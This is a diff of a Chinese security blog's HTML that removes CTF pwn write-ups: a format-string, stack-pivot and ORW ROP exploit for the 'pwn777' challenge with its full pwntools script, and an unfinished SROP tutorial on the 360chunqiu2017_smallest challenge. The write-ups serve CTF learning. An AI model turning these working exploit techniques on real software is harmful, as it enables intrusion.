-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;best!&quot;</span>,<span class="string">&#x27;%13$p%7$p%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">lsm = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;__libc_start_main =&gt;&#x27;</span>,<span class="built_in">hex</span>(lsm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">pgm = ret_addr - <span class="number">0x166f</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;program_base =&gt;&#x27;</span>,<span class="built_in">hex</span>(pgm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack =&gt;&#x27;</span>,<span class="built_in">hex</span>(stack)</span><br></pre></td></tr></table></figure>
-
-<p>到此我们完成了所需要的泄漏工作，可以开始修改 rbp 了，但是麻烦的一点是要将 rbp 修改为 .bss 段上的地址，我们需要将 6 个字节的地址全部都修改完，同时因为一次最多只能修改两个字节，所以我们需要三个存在于栈上并指向栈上的指针来完成修改的步骤，在这里刚好有三个（蓝线），我们需要让这三个指针都指向 rbp 所在的栈地址，这样就可以利用这三个指针来修改 rbp 的值。</p>
-
-
-<p>因为这三个指针跟 rbp 所在的栈地址只差1.5个字节，所以我们修改两个字节即可，计算得到这三个指针相对于格式化字符串的偏移分别为 6、15、29，所以修改指针部分的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rbp_addr = stack - <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rbp_addr&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%6$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">2</span>) + <span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">4</span>) + <span class="string">&#x27;c%29$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<p>stack 是我们泄漏出来的 rbp 的内容，而 rbp_addr 是 rbp 所在的栈地址，修改完后如下</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-3.jpg" class>
-
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-4.jpg" class>
-
-<p>可以看到我们得到了三个分别指向 rbp_addr 、rbp_addr + 2、rbp_addr + 4 的指针，然后就可以利用这三个指针来修改 rbp 的低六个字节了，计算这三个指针相对于格式化字符串的偏移分别为 10、41、43，修改 rbp 部分如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss = pgm + <span class="number">0x4060</span></span><br><span class="line">bss_l = (bss&amp;<span class="number">0xffff</span>) + <span class="number">0x20</span></span><br><span class="line">bss_m = ((bss&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x10000</span></span><br><span class="line">bss_h = ((bss&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x20000</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(bss_l) + <span class="string">&#x27;c%10$hn%&#x27;</span> + <span class="built_in">str</span>(bss_m-bss_l) + <span class="string">&#x27;c%41$hn%&#x27;</span> + <span class="built_in">str</span>(bss_h-bss_m) + <span class="string">&#x27;c%43$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<p>因为 .bss 段的低、中、高两个字节的大小顺序不是固定的，所以我们干脆输出 0x10000、0x20000个字节，这样写进去的时候也还是只写两个字节，这样就保证了大小顺序。同时我们考虑到我们要返回的话要输入题目所给的字符串 “jiaraniloveyou~” ，这部分字符串在输入后会覆盖 .bss 段的前几个字节，栈直接迁移到这里就会因为无法执行而报错，所以我们需要选择将 rbp 修改到 .bss 段稍微高一点的地址，所以加了 0x20 。</p>
-<p>修改完后如下：</p>
-<img src="/2021/12/12/2021%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-pwn777/%E8%B0%83%E8%AF%95-5.jpg" class>
-
-<p>这样在程序返回的时候就可以借助程序本身的 <code>leave_ret</code> 将栈迁移到 .bss 段进而执行我们的代码了。</p>
-<p>接下来我们只需要构造ORW chain再返回即可，构造部分如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">libc_base = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">ret = pgm + <span class="number">0x101a</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b92</span></span><br><span class="line">pop_rdi = pgm + <span class="number">0x1713</span></span><br><span class="line">pop_rsi_r15 = pgm + <span class="number">0x1711</span></span><br><span class="line">payload = p64(ret)*<span class="number">6</span> + p64(pop_rdi) + p64(bss + <span class="number">0xe0</span>) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(write) + p64(u64(<span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-
-<p>payload 前面的 ret 是用来垫高 ORW chain 部分的，防止被后面用来退出的输入覆盖，ORW部分很简单就不赘述了。</p>
-<p>最后输入 “jiaraniloveyou~” 用来退出循环即可。</p>
-<p>完整exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">lib = cdll.LoadLibrary(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name&quot;</span>,payload)</span><br><span class="line">lib.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(lib.rand())</span><br><span class="line">    p.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">    p.sendline(num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success =&gt;&quot;</span>,i)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;best!&quot;</span>,<span class="string">&#x27;%13$p%7$p%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">lsm = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;__libc_start_main =&gt;&#x27;</span>,<span class="built_in">hex</span>(lsm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">pgm = ret_addr - <span class="number">0x166f</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;program_base =&gt;&#x27;</span>,<span class="built_in">hex</span>(pgm)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack =&gt;&#x27;</span>,<span class="built_in">hex</span>(stack)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">rbp_addr = stack - <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rbp_addr&amp;<span class="number">0xffff</span>) + <span class="string">&#x27;c%6$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">2</span>) + <span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((rbp_addr&amp;<span class="number">0xffff</span>)+<span class="number">4</span>) + <span class="string">&#x27;c%29$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">bss = pgm + <span class="number">0x4060</span></span><br><span class="line">bss_l = (bss&amp;<span class="number">0xffff</span>) + <span class="number">0x20</span></span><br><span class="line">bss_m = ((bss&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x10000</span></span><br><span class="line">bss_h = ((bss&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>) + <span class="number">0x20000</span></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(bss_l) + <span class="string">&#x27;c%10$hn%&#x27;</span> + <span class="built_in">str</span>(bss_m-bss_l) + <span class="string">&#x27;c%41$hn%&#x27;</span> + <span class="built_in">str</span>(bss_h-bss_m) + <span class="string">&#x27;c%43$hn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">libc_base = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">ret = pgm + <span class="number">0x101a</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x1b92</span></span><br><span class="line">pop_rdi = pgm + <span class="number">0x1713</span></span><br><span class="line">pop_rsi_r15 = pgm + <span class="number">0x1711</span></span><br><span class="line">payload = p64(ret)*<span class="number">6</span> + p64(pop_rdi) + p64(bss + <span class="number">0xe0</span>) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(read)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(write) + p64(u64(<span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;jiaraniloveyou~&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/06/SROP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/06/SROP/" class="post-title-link" itemprop="url">SROP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-06 21:43:55" itemprop="dateCreated datePublished" datetime="2021-12-06T21:43:55+08:00">2021-12-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-17 20:34:40" itemprop="dateModified" datetime="2021-12-17T20:34:40+08:00">2021-12-17</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SROP（没写完）"><a href="#SROP（没写完）" class="headerlink" title="SROP（没写完）"></a>SROP（没写完）</h2><h4 id="一些比较好的文章"><a href="#一些比较好的文章" class="headerlink" title="一些比较好的文章"></a>一些比较好的文章</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85810">【技术分享】Sigreturn Oriented Programming攻击简介 - 安全客，安全资讯平台 (anquanke.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luozhaotian/article/details/79607572"> SROP基本原理和利用</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/1081">SROP_「二进制安全pwn基础」 - 网安 (wangan.com)</a></p>
-<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/112509274">BUUCTF]PWN——ciscn_2019_es_7[详解]</a></p>
-<p>SROP利用了Linux系统信号处理过程中的漏洞：在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。其中“处理完后再读取栈中的数据恢复寄存器中的值”就是 sigreturn 系统调用的作用，它会读取当前栈空间中的数据并传给相应寄存器。</p>
-<p>sigreturn 系统调用会改变所有寄存器的值，包括RSP/ESP与RBP/EBP的值，所以虽然可以利用SROP来实现任何想要的系统调用，但是同时其会改变栈顶指针，有时候这不是我们想要的。</p>
-<p>综上，SROP的攻击思路就是利用栈溢出设置返回地址为 sigreturn 系统调用的gadget，然后在栈上布置对应寄存器的数据，待 sigreturn 系统调用结束，所以寄存器的值都会变成我们布置在栈上的值。</p>
-<p>完成一次 SROP 攻击需要具备四个条件：</p>
-<ol>
-<li>存在栈溢出漏洞，使得栈上的数据可控</li>
-<li>需要知道 ‘/bin/sh’ 的地址，如果是自己构造在栈上的，那就需要知道栈的地址</li>
-<li>需要知道 syscall 指令在内存中的地址</li>
-<li>需要知道 sigreturn 系统调用的内存地址（这个单独的gadget并不是必须的，因为 sigreturn 也是一个系统调用，只要令 <code>rax = 15</code> 或 <code>eax = 77 </code> ，然后再调用 syscall 指令，就相当于调用了 sigreturn ）</li>
-</ol>
-<h3 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h3><p>整个程序的代码段只有如下部分</p>
-<img src="/2021/12/06/SROP/assembly.jpg" class>
-
-<p>反汇编如下</p>
-<img src="/2021/12/06/SROP/start.jpg" class>
-
-<p>从汇编代码来看，程序只是做了将相应的寄存器赋值的工作，然后就执行 <code>syscall_ret</code> 了，其中从 <code>mov rsi,rsp</code> 可知 read() 在栈顶处写入内容，结合汇编代码可知 <code>ret</code> 返回的地址也是栈顶中的内容，所以我们输入的前八个字节可以控制返回地址。</p>
-<p>因为程序只有这么些代码，显然需要我们手动构造系统调用来getshell，显然因为我们能利用的汇编段有限，所以大部分寄存器的值都无法直接被我们修改，所以这时我们可以利用 SROP 来将我们想修改的寄存器修改为对应值，而要调用 sigreturn 则需要 rax = 15 ，也就是系统调用号 = 15，那么怎么控制 rax 的值？我们需要知道read() 的返回值存放在 rax 中，而 read() 的返回值就是其读取的字节数，那么我们就可以通过控制输入的字节数来控制 rax 寄存器进而调用 sigreturn 。</p>
-<p>因为我们最终需要通过 SROP 来调用 <code>execve(&quot;/bin/sh&quot;,0,0)</code> ，所以我们还需要泄漏栈上的地址，否则无法计算出 “/bin/sh” 所在的地址。所以我们需要先调用一个输出函数，延续上述思路，我们通过控制输入的字节数来控制 rax ，同时在本题中合适的输出函数似乎只有 write() ，而 write() 的系统调用号为 1 ，我们需要做到：①只输入一个字节的同时控制返回地址。②write() 函数调用完后的返回地址也需要控制。</p>
-<p>那么怎么实现呢？我们可以在第一次输入时就将返回地址写入栈上，我们输入三个 <code>p64(0x4000B0)</code> ，第一个用来控制这次调用的返回，然后我们在第二次输入时输入 ‘\xb3’ 来将第一次输入时写入栈上的 ‘0x4000B0’ 的低字节的 ‘\xb0’ 覆盖掉，这样就控制了第二次的返回地址为 ‘0x4000B3’ ，返回到 ‘0x4000B3’ 是为了跳过 ‘0x4000B0’ 处的 <code>xor rax, rax</code> ，否则 rax 就被置0了。第二次返回之后就会调用 <code>write(1,&#39;rsp&#39;,0x400)</code> ，输出位于栈上的 0x400 个字节的数据，这其中肯定有栈上的地址，这样就完成了泄漏的工作，同时我们第一次输入时的第三个 ‘0x4000B0’ 控制了 write() 的返回，此后程序就会再调用一次 read() ，我们就可以继续后面的操作。</p>
-<p>read函数输入15个字节后返回到 b3 ，== 调用 sigreturn，后面要接 sigfram</p>
-<p>sigfram 和 ‘/bin/sh’ 一起send，这次在15字节之前send，所以要两次read</p>
-<p>现在这次send sig和bin ，</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1151,14 +1100,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
